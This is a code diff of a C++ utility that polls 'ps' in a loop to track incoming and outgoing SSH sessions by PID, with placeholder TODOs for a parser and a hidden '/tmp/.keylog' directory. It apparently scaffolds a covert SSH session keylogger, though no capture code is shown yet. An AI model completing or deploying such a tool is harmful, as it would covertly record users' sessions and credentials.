@@ -2,26 +2,33 @@
 #include <experimental/filesystem>
 #include <zconf.h>
 #include <cstring>
+#include <thread>
+#include <algorithm>
 
 namespace fs = std::experimental::filesystem;
+
 
 class Process{
 public:
     Process(std::string user, uint16_t pid, std::string cmd, std::string args):
     _user(user), _pid(pid), _cmd(cmd), _args(args){};
 
-    bool find_sshd(){
+    bool find_sshd() const {
         if (_args.find("pts") != std::string::npos){
             std::cout << "Incoming ssh connection: PID = " << _pid << std::endl;
             return true;
         } else return false;
     }
 
-    bool find_ssh(){
+    bool find_ssh() const {
         if (_cmd.find("ssh") != std::string::npos){
             std::cout << "Outgoing ssh connection: PID = " << _pid << std::endl;
             return true;
         } else return false;
+    }
+
+    uint16_t get_pid() const {
+        return _pid;
     }
 
 private:
@@ -53,7 +60,7 @@ std::vector<Process> get_proc_list_of_ssh(){
     std::array<char, 128> buffer{};
     std::vector<Process> proc_list{};
 
-    std::cout << "Opening reading pipe from ps process output" << std::endl;
+    std::cout << "Opening reading PIPE from ps process output" << std::endl;
     FILE* pipe = popen(command.c_str(), "r");
     if (!pipe)
     {
@@ -72,27 +79,41 @@ std::vector<Process> get_proc_list_of_ssh(){
         }
     }
     auto returnCode = pclose(pipe);
-    std::cout << returnCode << std::endl;
+    std::cout << "Closing PIPE return code: " << returnCode << std::endl;
     return proc_list;
 }
 
-void check_ps(){
+void check_ps(std::vector<uint16_t>& procs_in_monitoring){
     std::vector<Process> proc_list = get_proc_list_of_ssh();
     for (auto &proc : proc_list){
-        proc.find_sshd();
-        proc.find_ssh();
+        if (proc.find_sshd()){
+            auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
+            if(it == procs_in_monitoring.end()){
+                procs_in_monitoring.emplace_back(proc.get_pid());
+                // TODO: Async parser
+            }
+        }
+        else if(proc.find_ssh()){
+            auto it = std::find(procs_in_monitoring.begin(), procs_in_monitoring.end(), proc.get_pid());
+            if(it == procs_in_monitoring.end()){
+                procs_in_monitoring.emplace_back(proc.get_pid());
+                // TODO: Async parser
+            }
+        }
     }
 }
 
 int main() {
 
     const fs::path path_to_log = "/tmp/.keylog";
+    int64_t sleep_time = 3;
     std::error_code er;
     if(fs::exists(path_to_log, er)){
         fs::create_directories(path_to_log);
     }
-
-    check_ps();
-
-    return 0;
+    std::vector<uint16_t> procs_in_monitoring{};
+    while(true){
+        check_ps(procs_in_monitoring);
+        std::this_thread::sleep_for(std::chrono::seconds(sleep_time));
+    }
 }
